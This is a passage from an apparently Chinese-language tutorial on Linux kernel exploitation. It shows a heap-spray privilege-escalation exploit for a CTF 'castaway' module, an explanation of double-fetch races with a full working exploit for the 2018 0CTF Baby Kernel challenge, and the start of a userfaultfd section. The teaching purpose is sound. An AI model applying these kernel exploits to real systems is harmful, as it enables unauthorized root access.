class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">    err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">    err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">            .size = size,</span><br><span class="line">            .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open castaway device!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, getpagesize(), <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">uint32_t</span> *) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc();</span><br><span class="line">        edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking privilege in child processes */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="race-condition">Race condition</h1>
<h2 id="double-fetch">double fetch</h2>
<p>用户空间向内核传递数据时，内核先通过通过 copy_from_user
等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。
一个典型的 Double Fetch
漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/109d7ba131d23706c6a1c6d7ba2cb5e9.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="例题2018-0ctf-finals-baby-kernel">例题：2018 0CTF Finals Baby
Kernel</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/0ctf2018_babykernel" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<code>baby_ioctl</code> 函数有两个功能。</p>
<ul>
<li><p>0x6666：打印 flag 的存放地址 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( request == <span class="number">0x6666</span> )</span><br><span class="line">&#123;</span><br><span class="line">  printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>0x1337：检验用户输入的参数地址是否合法以及用户输入的 flag
内容是否正确。如果通过检验则打印 flag 内容。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall _chk_range_not_ok(<span class="type">void</span> *ptr, __int64 size, <span class="type">void</span> *user_space)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> carry_flag; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">void</span> *buf_end; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  carry_flag = __CFADD__(size, ptr);</span><br><span class="line">  buf_end = (<span class="type">char</span> *)ptr + size;</span><br><span class="line">  <span class="keyword">return</span> carry_flag || user_space &lt; buf_end;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( request == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(input, <span class="keyword">sizeof</span>(Input), *(<span class="type">void</span> **)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(input-&gt;flag, input-&gt;len, *(<span class="type">void</span> **)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; input-&gt;len == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input-&gt;flag[i] != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></p>
<p>调试发现第一次 <code>_chk_range_not_ok</code>
检查结构体范围是否在用户空间。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8f81d2a9f628560e2d574c2ea827899c.png"
                     
alt="在这里插入图片描述" 
                > 第二次 <code>_chk_range_not_ok</code> 检查
flag 是否在用户空间。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a3dea60c923105f3505c359f265c77f1.png"
                     
alt="在这里插入图片描述" 
                > 因此我们可以起一个线程改 <code>flag</code>
指针，可以有一定概率在第二次 <code>_chk_range_not_ok</code> 和校验 flag
之间将 <code>flag</code> 指针指向真正的 flag 从而通过对 flag
的校验。</p></li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRYTIME 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> *addr;</span><br><span class="line"><span class="type">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[LEN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_attr_value</span><span class="params">(<span class="type">void</span> *s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> *<span class="title">s1</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span> (finish == <span class="number">0</span>) &#123;</span><br><span class="line">        s1-&gt;flag = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> addr_fd;</span><br><span class="line">    <span class="type">char</span> *idx;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addr_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    lseek(addr_fd, -LEN, SEEK_END);</span><br><span class="line">    read(addr_fd, buf, LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        idx += <span class="number">16</span>;</span><br><span class="line">        addr = (<span class="type">char</span> *) strtoull(idx, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] flag addr: %p\n&quot;</span>, addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span> =</span> &#123;<span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>, <span class="number">33</span>&#125;;</span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, (<span class="type">void</span> *) change_attr_value, &amp;t);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TRYTIME; i++) &#123;</span><br><span class="line">        t.flag = <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>;</span><br><span class="line">        ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]result is :&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="userfaultfd">userfaultfd</h2>
<p>条件竞争的成功利用往往需要正确的顺序，然而若是直接开两个线程进行竞争，命中的几率是比较低的，就比如说前面的
double fetch 尝试 0x1000 次也不一定会命中一次。而 userfaultfd
本身只是一个常规的与处理缺页异常相关的系统调用，但是通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高。</p>
<p>内核的内存主要有两个区域，RAM和交换区，将要被使用的内存放在RAM，暂时用不到的内存放在交换区，内核控制交换进出的过程。RAM中的地址是物理地址，内核使用虚拟地址，其通过多级页表建立虚拟地址到物理地址的映射。但有的内存既不在RAM又不在交换区，比如mmap出来的内存，这块内存在读写它之前并没有分配实际的物理页。例如：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mmap(<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE, fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
内核并未将<code>fd</code>内容拷贝到<code>0x1337000</code>，只是将地址<code>0x1337000</code>映射到文件<code>fd</code>。
比如此时有下列代码运行 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> c = *(<span class="type">char</span> *) <span class="number">0x1337000</span>;</span><br></pre></td></tr></table></figure></div>
可以看到在读取数据，但是在实际读取中由于没有为 <code>0x2337000</code>
分配物理页会触发缺页异常，此时内核会进行以下操作：</p>
<ul>
<li>为 <code>0x1337000</code> 创建物理帧</li>
<li>从 <code>fd</code> 读取内容到
<code>0x1337000</code>（如果是堆空间映射的话，会将对应的物理帧清零）</li>
<li>在页表中创建虚拟地址 <code>0x1337000</code>
到物理地址之间的映射。</li>
</ul>
<p>userfaultfd 是 linux
下的一种缺页处理机制，该处理机制可以让用户自定义函数来处理缺页异常。下面举一个向缺页处写入数据的例子：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mmap 映射一块虚拟内存用来存放待写入的数据</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span 